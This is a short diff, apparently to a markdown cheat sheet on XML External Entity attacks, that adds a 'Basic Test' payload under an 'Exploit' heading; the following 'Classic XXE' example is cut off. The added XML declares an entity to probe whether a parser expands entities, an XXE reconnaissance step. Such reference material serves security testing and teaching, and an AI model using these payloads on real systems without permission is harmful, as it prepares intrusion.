@@ -3,6 +3,16 @@ An XML External Entity attack is a type of attack against an application that pa
 
 ## Exploit
 
+Basic Test
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+```
+
 Classic XXE
 ```
 <?xml version="1.0"?>
